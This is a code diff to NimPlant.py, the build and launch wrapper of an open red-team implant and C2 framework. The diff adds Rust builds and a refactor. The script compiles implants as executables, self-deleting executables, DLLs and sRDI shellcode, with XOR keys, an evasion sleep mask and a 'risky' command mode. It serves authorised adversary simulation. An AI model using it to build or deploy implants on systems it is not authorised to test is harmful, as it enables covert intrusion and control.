@@ -1,8 +1,9 @@
 #!/usr/bin/python3
+# pylint: disable=import-outside-toplevel
 
 # -----
 #
-#   NimPlant - A light-weight stage 1 implant and C2 written in Nim and Python
+#   NimPlant - A light-weight stage 1 implant and C2 written in Nim|Rust and Python
 #   By Cas van Cooten (@chvancooten)
 #
 #   This is a wrapper script to configure and generate NimPlant and its C2 server
@@ -42,7 +43,7 @@ def print_banner():
     | |\  | | | | | | |  __/| | (_| | | | | |_ 
     |_| \_|_|_| |_| |_|_|   |_|\__,_|_| |_|\__|                                  
                                                                                                   
-        A light-weight stage 1 implant and C2 written in Nim and Python
+        A light-weight stage 1 implant and C2 written in Nim|Rust and Python
         By Cas van Cooten (@chvancooten)
     """
     )
@@ -55,7 +56,7 @@ def print_usage():
         python3 NimPlant.py command [required args] <optional args>
 
     Acceptable commands:
-        compile [exe / exe-selfdelete / dll / raw / all] <nim / nim-debug> <rotatekey>
+        compile [exe / exe-selfdelete / dll / raw / all] <nim / rust / nim-debug / rust-debug> <rotatekey>
         server <server name>
         cleanup
     """
@@ -64,7 +65,7 @@ def print_usage():
 
 def get_xor_key(force_new=False):
     if os.path.isfile(".xorkey") and not force_new:
-        file = open(".xorkey", "r")
+        file = open(".xorkey", "r", encoding="utf-8")
         xor_key = int(file.read())
     else:
         print("Generating unique XOR key for pre-crypto operations...")
@@ -72,44 +73,58 @@ def get_xor_key(force_new=False):
             "NOTE: Make sure the '.xorkey' file matches if you run the server elsewhere!"
         )
         xor_key = random.randint(0, 2147483647)
-        with open(".xorkey", "w") as file:
+        with open(".xorkey", "w", encoding="utf-8") as file:
             file.write(str(xor_key))
 
     return xor_key
 
 
 def compile_implant(implant_type, binary_type, xor_key):
-    if implant_type == "nim-debug":
-        message = "NimPlant with debugging enabled"
-        compile_function = compile_nim_debug
-    else:
-        message = "NimPlant"
-        compile_function = compile_nim
+    # Parse config for certain compile-time tasks
+    config_path = os.path.abspath(
+        os.path.join(os.path.dirname(sys.argv[0]), "config.toml")
+    )
+    config = toml.load(config_path)
+
+    match implant_type:
+        case "nim":
+            message = "NimPlant"
+            compile_function = compile_nim
+        case "nim-debug":
+            message = "NimPlant with debugging enabled"
+            compile_function = compile_nim_debug
+        case "rust":
+            message = "Rusty NimPlant"
+            compile_function = compile_rust
+        case "rust-debug":
+            message = "Rusty NimPlant with debugging enabled"
+            compile_function = compile_rust_debug
 
     if binary_type == "exe":
         print(f"Compiling .exe for {message}")
-        compile_function("exe", xor_key)
+        compile_function("exe", xor_key, config)
     elif binary_type == "exe-selfdelete":
         print(f"Compiling self-deleting .exe for {message}")
-        compile_function("exe-selfdelete", xor_key)
+        compile_function("exe-selfdelete", xor_key, config)
     elif binary_type == "dll":
         print(f"Compiling .dll for {message}")
-        compile_function("dll", xor_key)
+        compile_function("dll", xor_key, config)
     elif binary_type == "raw" or binary_type == "bin":
         print(f"Compiling .bin for {message}")
-        compile_function("raw", xor_key)
+        compile_function("raw", xor_key, config)
     else:
+        # Compile all
         print(f"Compiling .exe for {message}")
-        compile_function("exe", xor_key)
+        compile_function("exe", xor_key, config)
         print(f"Compiling self-deleting .exe for {message}")
-        compile_function("exe-selfdelete", xor_key)
+        compile_function("exe-selfdelete", xor_key, config)
         print(f"Compiling .dll for {message}")
-        compile_function("dll", xor_key)
+        compile_function("dll", xor_key, config)
         print(f"Compiling .bin for {message}")
-        compile_function("raw", xor_key)
+        compile_function("raw", xor_key, config)
 
 
-def compile_nim_debug(binary_type, _):
+def compile_nim_debug(binary_type, xor_key, config):
     if binary_type == "exe-selfdelete":
         print("ERROR: Cannot compile self-deleting NimPlant with debugging enabled!")
         print(
@@ -118,28 +133,10 @@ def compile_nim_debug(binary_type, _):
         print("       Skipping this build...")
         return
 
-    compile_nim(binary_type, _, debug=True)
+    compile_nim(binary_type, xor_key, config, debug=True)
 
 
-def compile_nim(binary_type, xor_key, debug=False):
-    # Parse config for certain compile-time tasks
-    config_path = os.path.abspath(
-        os.path.join(os.path.dirname(sys.argv[0]), "config.toml")
-    )
-    config = toml.load(config_path)
-
-    # Enable Ekko sleep mask if defined in config.toml, but only for self-contained executables
-    sleep_mask_enabled = config["nimplant"]["sleepMask"]
-    if sleep_mask_enabled and binary_type not in [
-        "exe",
-        "exe-selfdelete",
-        "dll",
-        "raw",
-    ]:
-        print("       ERROR: Ekko sleep mask is only supported for executables!")
-        print(f"       Compiling {binary_type} without sleep mask...")
-        sleep_mask_enabled = False
-
+def compile_nim(binary_type, xor_key, config, debug=False):
     # Construct compilation command
     if binary_type == "exe" or binary_type == "exe-selfdelete" or binary_type == "dll":
         compile_command = f"nim c --hints:off --warnings:off -d:xor_key={xor_key} -d:release -d:strip -d:noRes"
@@ -166,12 +163,14 @@ def compile_nim(binary_type, xor_key, debug=False):
                 + " -o:client/bin/NimPlant.dll --app=lib --nomain -d:exportDll --passL:-Wl,--dynamicbase --gc:orc"
             )
 
+        # Sleep mask enabled only if defined in config.toml
+        sleep_mask_enabled = config["nimplant"]["sleepMask"]
         if sleep_mask_enabled:
             compile_command = compile_command + " -d:sleepmask"
 
         # Allow risky commands only if defined in config.toml
-        risky_mode_allowed = config["nimplant"]["riskyMode"]
-        if risky_mode_allowed:
+        risky_mode = config["nimplant"]["riskyMode"]
+        if risky_mode:
             compile_command = compile_command + " -d:risky"
 
         compile_command = compile_command + " client/NimPlant.nim"
@@ -179,14 +178,14 @@ def compile_nim(binary_type, xor_key, debug=False):
 
     elif binary_type == "raw":
         if not os.path.isfile("client/bin/NimPlant.dll"):
-            compile_nim("dll", xor_key)
+            compile_nim("dll", xor_key, config)
         else:
             # Compile a new DLL NimPlant if no recent version exists
             file_mod_time = os.stat("client/bin/NimPlant.dll").st_mtime
             last_time = (time.time() - file_mod_time) / 60
 
             if not last_time < 5:
-                compile_nim("dll", xor_key)
+                compile_nim("dll", xor_key, config)
 
         # Convert DLL to PIC using sRDI
         dll = open("client/bin/NimPlant.dll", "rb").read()
@@ -195,7 +194,55 @@ def compile_nim(binary_type, xor_key, debug=False):
             f.write(shellcode)
 
 
-if __name__ == "__main__":
+def compile_rust_debug(binary_type, xor_key, config):
+    compile_rust(binary_type, xor_key, config, debug=True)
+
+
+def compile_rust(binary_type, _xor_key, config, debug=False):
+    # TODO: Docker compilation (also update README)
+    # TODO: Automate opsec tips / rustup chain from Cargo.toml?
+    print("NOTE: Follow the tips in 'client-rs/Cargo.toml' for increased opsec.")
+
+    # Construct compilation command
+    compile_command = (
+        "cargo build --manifest-path=client-rs/Cargo.toml --target-dir=client-rs/bin -q"
+    )
+
+    match binary_type:
+        case "exe":
+            pass  # No additional flags needed
+        case "exe-selfdelete":
+            # TODO: Exe-Selfdelete
+            print("RUST EXE-SELFDELETE NOT YET IMPLEMENTED.")
+            exit(1)
+        case "dll":
+            # TODO: Dll
+            print("RUST DLL NOT YET IMPLEMENTED.")
+            exit(1)
+        case "raw":
+            # TODO: Shellcode
+            print("RUST SHELLCODE NOT YET IMPLEMENTED.")
+            exit(1)
+
+    if not debug:
+        compile_command = compile_command + " --release"
+
+    # Sleep mask enabled only if defined in config.toml
+    sleep_mask_enabled = config["nimplant"]["sleepMask"]
+    if sleep_mask_enabled:
+        # TODO: Sleep mask
+        print("RUST SLEEP MASK NOT YET IMPLEMENTED.")
+        exit(1)
+
+    # Allow risky commands only if defined in config.toml
+    risky_mode = config["nimplant"]["riskyMode"]
+    if risky_mode:
+        compile_command = compile_command + " --features=risky"
+
+    os.system(compile_command)
+
+
+def main():
     print_banner()
 
     if not os.path.isfile("config.toml"):
@@ -206,12 +253,17 @@ if __name__ == "__main__":
 
     if len(sys.argv) > 1:
         if sys.argv[1] == "compile":
-            if len(sys.argv) > 3 and sys.argv[3] in ["nim", "nim-debug"]:
-                implant = sys.argv[3]
+            if len(sys.argv) > 3 and sys.argv[3].lower() in [
+                "nim",
+                "nim-debug",
+                "rust",
+                "rust-debug",
+            ]:
+                implant = sys.argv[3].lower()
             else:
                 implant = "nim"
 
-            if len(sys.argv) > 2 and sys.argv[2] in [
+            if len(sys.argv) > 2 and sys.argv[2].lower() in [
                 "exe",
                 "exe-selfdelete",
                 "dll",
@@ -219,7 +271,7 @@ if __name__ == "__main__":
                 "bin",
                 "all",
             ]:
-                binary = sys.argv[2]
+                binary = sys.argv[2].lower()
             else:
                 binary = "all"
 
@@ -230,17 +282,18 @@ if __name__ == "__main__":
 
             compile_implant(implant, binary, xor_key)
 
-            print("Done compiling! You can find compiled binaries in 'client/bin/'.")
+            out_path = "client-rs/bin" if implant.startswith("rust") else "client/bin"
+            print(f"Done compiling! You can find compiled binaries in '{out_path}'.")
 
         elif sys.argv[1] == "server":
             xor_key = get_xor_key()
-            from server.server import main
+            from server.server import main as server_main
 
             try:
                 name = sys.argv[2]
-                main(xor_key, name)
-            except:
-                main(xor_key, "")
+                server_main(xor_key, name)
+            except IndexError:
+                server_main(xor_key, "")
 
         elif sys.argv[1] == "cleanup":
             from shutil import rmtree
@@ -284,3 +337,7 @@ if __name__ == "__main__":
     else:
         print_usage()
         exit(1)
+
+
+if __name__ == "__main__":
+    main()
